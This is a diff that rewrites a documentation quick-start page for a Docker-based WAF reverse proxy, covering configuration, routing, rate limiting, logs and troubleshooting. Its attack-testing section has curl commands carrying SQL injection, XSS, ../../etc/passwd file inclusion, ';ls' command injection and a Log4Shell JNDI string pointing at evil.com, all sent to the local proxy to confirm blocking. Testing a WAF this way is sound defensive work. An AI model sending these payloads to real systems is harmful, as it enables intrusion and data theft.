@@ -1,80 +1,315 @@
 ---
-title: "Quickstart"
-description: "Start building awesome documentation in minutes"
+title: Quick Start
+description: Get Coraza Proxy running in 5 minutes
 ---
 
-## Get started in three steps
+## Prerequisites
 
-Get your documentation site running locally and make your first customization.
+- Docker installed and running
+- A backend service to protect (or use a test backend)
+- Basic understanding of reverse proxies
 
-### Step 1: Set up your local environment
+<Info>
+This guide uses Docker for the fastest setup. For production deployments or building from source, see the [Installation](/installation) guide.
+</Info>
 
-<AccordionGroup>
-  <Accordion icon="copy" title="Clone your docs locally">
-    During the onboarding process, you created a GitHub repository with your docs content if you didn't already have one. You can find a link to this repository in your [dashboard](https://dashboard.mintlify.com).
+## Quick Setup
+
+<Steps>
+  <Step title="Pull the Docker Image">
+    Pull the latest Coraza Proxy image:
     
-    To clone the repository locally so that you can make and preview changes to your docs, follow the [Cloning a repository](https://docs.github.com/en/repositories/creating-and-managing-repositories/cloning-a-repository) guide in the GitHub docs.
-  </Accordion>
-  <Accordion icon="rectangle-terminal" title="Start the preview server">
-    1. Install the Mintlify CLI: `npm i -g mint`
-    2. Navigate to your docs directory and run: `mint dev`
-    3. Open `http://localhost:3000` to see your docs live!
+    ```bash
+    docker pull wafsec:local
+    ```
     
-    <Tip>Your preview updates automatically as you edit files.</Tip>
-  </Accordion>
-</AccordionGroup>
-
-### Step 2: Deploy your changes
-
-<AccordionGroup>
-  <Accordion icon="github" title="Install our GitHub app">
-    Install the Mintlify GitHub app from your [dashboard](https://dashboard.mintlify.com/settings/organization/github-app).
+    Or build it yourself from the repository:
     
-    Our GitHub app automatically deploys your changes to your docs site, so you don't need to manage deployments yourself.
-</Accordion>
-<Accordion icon="palette" title="Update your site name and colors">
-    For a first change, let's update the name and colors of your docs site.
+    ```bash
+    docker build --no-cache -t wafsec:local .
+    ```
+  </Step>
 
-    1. Open `docs.json` in your editor.
-    2. Change the `"name"` field to your project name.
-    3. Update the `"colors"` to match your brand.
-    4. Save and see your changes instantly at `http://localhost:3000`.
+  <Step title="Configure Environment">
+    Create a `.env` file with your configuration. Here's a minimal example:
+    
+    ```bash .env
+    # Backend routing - JSON format
+    BACKENDS='{"waf.test.local":["web:80"], "default":["localhost:5000"]}'
+    
+    # Port to listen on
+    PORT=8081
+    
+    # Host classification
+    PROXY_WEB_HOSTS=waf.test.local
+    
+    # Rate limiting
+    PROXY_RATE_LIMIT=5
+    PROXY_RATE_BURST=10
+    ```
+    
+    <Accordion title="Configuration Breakdown">
+      - `BACKENDS`: JSON mapping of hostnames to backend servers
+      - `PORT`: Port for Coraza Proxy to listen on (default: 8081)
+      - `PROXY_WEB_HOSTS`: Comma-separated list of hosts using PL1 (web) rules
+      - `PROXY_RATE_LIMIT`: Requests per second per IP
+      - `PROXY_RATE_BURST`: Maximum burst size for rate limiting
+    </Accordion>
+  </Step>
 
-    <Tip>Try changing the primary color to see an immediate difference!</Tip>
-  </Accordion>
-</AccordionGroup>
+  <Step title="Set Up Local DNS (Optional)">
+    For local testing, add entries to `/etc/hosts`:
+    
+    ```bash
+    sudo sh -c 'echo "127.0.0.1 waf.test.local" >> /etc/hosts'
+    sudo sh -c 'echo "127.0.0.1 api.test.local" >> /etc/hosts'
+    ```
+  </Step>
 
-### Step 3: Go live
+  <Step title="Start the Proxy">
+    Run Coraza Proxy with your configuration:
+    
+    ```bash
+    docker run -d \
+      --name coraza-proxy \
+      -p 8081:8081 \
+      --env-file .env \
+      wafsec:local
+    ```
+    
+    Check the logs to verify it started:
+    
+    ```bash
+    docker logs -f coraza-proxy
+    ```
+    
+    You should see:
+    ```
+    GeoIP database loaded
+    Coraza WAF started
+    Listening on :8081
+    ```
+  </Step>
 
-<Accordion icon="rocket" title="Publish your docs">
-  1. Commit and push your changes.
-  2. Your docs will update and be live in moments!
-</Accordion>
+  <Step title="Test the Setup">
+    Send a legitimate request:
+    
+    ```bash
+    curl -H "Host: waf.test.local" http://localhost:8081/
+    ```
+    
+    Test WAF protection with a SQL injection attempt:
+    
+    ```bash
+    curl "http://localhost:8081/?id=1%27%20OR%20%271%27=%271" \
+      -H "Host: waf.test.local"
+    ```
+    
+    This should be blocked with:
+    ```
+    Request blocked by WAF (body)
+    ```
+  </Step>
+</Steps>
 
-## Next steps
+## Configuration Examples
 
-Now that you have your docs running, explore these key features:
+### Single Backend
 
-<CardGroup cols={2}>
+Protect a single application:
 
-<Card title="Write Content" icon="pen-to-square" href="/essentials/markdown">
-  Learn MDX syntax and start writing your documentation.
-</Card>
+```bash .env
+BACKENDS='{"default":["localhost:5000"]}'
+PORT=8081
+PROXY_WEB_HOSTS=waf.test.local
+```
 
-<Card title="Customize style" icon="palette" href="/essentials/settings">
-  Make your docs match your brand perfectly.
-</Card>
+### Multiple Hosts
 
-<Card title="Add code examples" icon="square-code" href="/essentials/code">
-  Include syntax-highlighted code blocks.
-</Card>
+Route different domains to different backends:
 
-<Card title="API documentation" icon="code" href="/api-reference/introduction">
-  Auto-generate API docs from OpenAPI specs.
-</Card>
+```bash .env
+BACKENDS='{
+  "web.example.com": ["web-server:80"],
+  "api.example.com": ["api-server:8000"],
+  "default": ["fallback:80"]
+}'
 
-</CardGroup>
+PROXY_WEB_HOSTS=web.example.com
+PROXY_APIS_HOSTS=api.example.com
+```
+
+### Path-Based Routing
+
+Route different URL paths to different backends:
+
+```bash .env
+BACKENDS='{
+  "example.com": {
+    "default": ["web:80"],
+    "paths": {
+      "/api": ["api:8000"],
+      "/static": ["cdn:80"]
+    }
+  }
+}'
+```
 
 <Note>
-  **Need help?** See our [full documentation](https://mintlify.com/docs) or join our [community](https://mintlify.com/community).
+Path-based routing uses longest prefix matching. A request to `/api/users` matches `/api` before falling back to `default`.
 </Note>
+
+### Load Balancing
+
+Distribute traffic across multiple backend servers:
+
+```bash .env
+BACKENDS='{
+  "app.example.com": ["web1:80", "web2:80", "web3:80"]
+}'
+```
+
+Coraza Proxy uses round-robin load balancing automatically.
+
+## Testing Attack Protection
+
+### SQL Injection Tests
+
+<CodeGroup>
+```bash Simple SQLi
+curl "http://localhost:8081/?id=1'%20OR%20'1'='1" \
+  -H "Host: waf.test.local"
+```
+
+```bash UNION Attack
+curl "http://localhost:8081/?q=1%20UNION%20SELECT%201,2,3--" \
+  -H "Host: waf.test.local"
+```
+
+```bash Boolean-based
+curl "http://localhost:8081/?q=1%20AND%201=1" \
+  -H "Host: waf.test.local"
+```
+</CodeGroup>
+
+### Cross-Site Scripting (XSS)
+
+<CodeGroup>
+```bash Classic XSS
+curl "http://localhost:8081/?x=%3Cscript%3Ealert(1)%3C/script%3E" \
+  -H "Host: waf.test.local"
+```
+
+```bash Event Handler XSS
+curl "http://localhost:8081/?q=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E" \
+  -H "Host: waf.test.local"
+```
+</CodeGroup>
+
+### Local File Inclusion (LFI)
+
+```bash
+curl "http://localhost:8081/?file=../../etc/passwd" \
+  -H "Host: waf.test.local"
+```
+
+### Remote Command Execution
+
+```bash
+curl "http://localhost:8081/?cmd=;ls%20-la" \
+  -H "Host: waf.test.local"
+```
+
+### Log4Shell Detection
+
+```bash
+curl -X POST "http://localhost:8081/" \
+  -H "Host: waf.test.local" \
+  -H "User-Agent: \${jndi:ldap://evil.com}" \
+  https://sandbox.coreruleset.org
+```
+
+<Warning>
+All these test payloads should be **blocked** by Coraza Proxy. If any pass through, check your configuration and rule sets.
+</Warning>
+
+## Rate Limiting Test
+
+Test the rate limiter by sending rapid requests:
+
+```bash
+for i in {1..25}; do 
+  curl -i -s "http://localhost:8081/" \
+    -H "Host: waf.test.local" | grep "HTTP/1.1"
+done
+```
+
+You should see `429 Too Many Requests` after exceeding the configured rate limit.
+
+## Monitoring & Logs
+
+### Check Audit Logs
+
+Audit logs are written in JSON format:
+
+```bash
+docker exec coraza-proxy tail -f /tmp/log/coraza/audit.log | jq
+```
+
+### View Debug Logs
+
+For troubleshooting, enable debug logging:
+
+```bash .env
+SECDEBUGLOGLEVEL=3
+```
+
+Then view:
+
+```bash
+docker exec coraza-proxy tail -f /tmp/log/coraza/debug.log
+```
+
+## Next Steps
+
+<CardGroup cols={2}>
+  <Card title="Production Configuration" icon="gear" href="/installation">
+    Learn about advanced configuration options and production deployment
+  </Card>
+  <Card title="Security Testing" icon="shield-halved" href="/security/testing">
+    Test WAF protection with real attack payloads
+  </Card>
+</CardGroup>
+
+## Common Issues
+
+<Accordion title="Connection Refused to Backend">
+  **Error**: `Bad Gateway: dial tcp: connect: connection refused`
+  
+  **Solution**: Ensure your backend service is running and accessible from the Docker container. Use Docker service names if running in docker-compose.
+</Accordion>
+
+<Accordion title="WAF Not Configured for Host">
+  **Error**: `WAF not configured for this host`
+  
+  **Solution**: Add the hostname to either `PROXY_WEB_HOSTS` or `PROXY_APIS_HOSTS` depending on whether it should use web or API rules.
+</Accordion>
+
+<Accordion title="Too Many False Positives">
+  **Issue**: Legitimate requests are being blocked
+  
+  **Solution**: 
+  - Lower the paranoia level in your CRS setup configuration
+  - Add exclusion rules for specific endpoints
+  - Use PL2 (API profile) for JSON-heavy endpoints
+</Accordion>
+
+<Accordion title="Rate Limiting Too Strict">
+  **Issue**: Users hitting rate limits during normal use
+  
+  **Solution**: Adjust `PROXY_RATE_LIMIT` and `PROXY_RATE_BURST`:
+  ```bash
+  PROXY_RATE_LIMIT=10  # Increase requests per second
+  PROXY_RATE_BURST=20  # Increase burst capacity
+  ```
+</Accordion>
